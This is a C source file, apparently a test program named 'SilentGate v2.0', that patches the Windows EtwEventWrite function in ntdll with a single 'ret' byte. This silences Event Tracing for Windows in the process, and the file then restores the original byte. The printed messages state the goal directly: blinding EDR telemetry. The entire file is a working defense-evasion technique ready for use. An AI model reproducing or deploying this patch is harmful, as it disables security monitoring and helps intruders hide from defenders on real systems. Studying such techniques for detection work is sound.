#include <windows.h>
#include <stdio.h>

// SilentGate v2.0 - ETW Patcher Test
// Author: JarDani

#define RET_BYTE          0xC3
#define MOV_R10_RCX_BYTE  0x4C
#define PAGE_EXECUTE_READWRITE 0x40

int main() {
    printf("[ETW PATCHER] SilentGate v2.0 - ETW Patch Test\n");
    printf("[ETW PATCHER] Author: JarDani\n\n");

    // Step 1 - Find EtwEventWrite
    printf("[STEP 1] Finding EtwEventWrite in ntdll...\n");
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        printf("[ERROR] Could not get ntdll handle\n");
        return 1;
    }

    FARPROC etw_addr = GetProcAddress(ntdll, "EtwEventWrite");
    if (!etw_addr) {
        printf("[ERROR] Could not find EtwEventWrite\n");
        return 1;
    }
    printf("         EtwEventWrite at: %p\n", etw_addr);

    // Step 2 - Read current first byte
    printf("[STEP 2] Reading current first byte...\n");
    BYTE original_byte = *(BYTE*)etw_addr;
    printf("         Current first byte: 0x%02X\n", original_byte);

    if (original_byte == RET_BYTE) {
        printf("[INFO]   Already patched\n");
        return 0;
    }

    if (original_byte != MOV_R10_RCX_BYTE) {
        printf("[WARN]   Unexpected byte 0x%02X\n", original_byte);
    }

    // Step 3 - Change protection
    printf("[STEP 3] Changing memory protection...\n");
    DWORD old_protect = 0;
    VirtualProtect(etw_addr, 1, PAGE_EXECUTE_READWRITE, &old_protect);
    printf("         Old protection: 0x%X\n", old_protect);

    // Step 4 - Write patch
    printf("[STEP 4] Writing 0xC3 (ret) patch...\n");
    *(BYTE*)etw_addr = RET_BYTE;

    // Step 5 - Restore protection
    printf("[STEP 5] Restoring protection...\n");
    VirtualProtect(etw_addr, 1, old_protect, &old_protect);

    // Step 6 - Verify
    printf("[STEP 6] Verifying patch...\n");
    BYTE patched_byte = *(BYTE*)etw_addr;
    printf("         Patched byte: 0x%02X\n", patched_byte);

    if (patched_byte == RET_BYTE) {
        printf("\n[SUCCESS] EtwEventWrite patched\n");
        printf("[SUCCESS] All ETW events from this process are silenced\n");
        printf("[SUCCESS] EDR telemetry feed is now blind\n");
    } else {
        printf("\n[FAILED] Patch did not apply\n");
        return 1;
    }

    // Step 7 - Restore original
    printf("\n[STEP 7] Restoring original byte...\n");
    VirtualProtect(etw_addr, 1, PAGE_EXECUTE_READWRITE, &old_protect);
    *(BYTE*)etw_addr = original_byte;
    VirtualProtect(etw_addr, 1, old_protect, &old_protect);

    BYTE restored = *(BYTE*)etw_addr;
    printf("         Restored byte: 0x%02X\n", restored);
    printf("[SUCCESS] EtwEventWrite restored to original state\n");

    printf("\n[ETW PATCHER] Test complete\n");
    printf("[ETW PATCHER] Press any key to exit\n");
    getchar();
    return 0;
}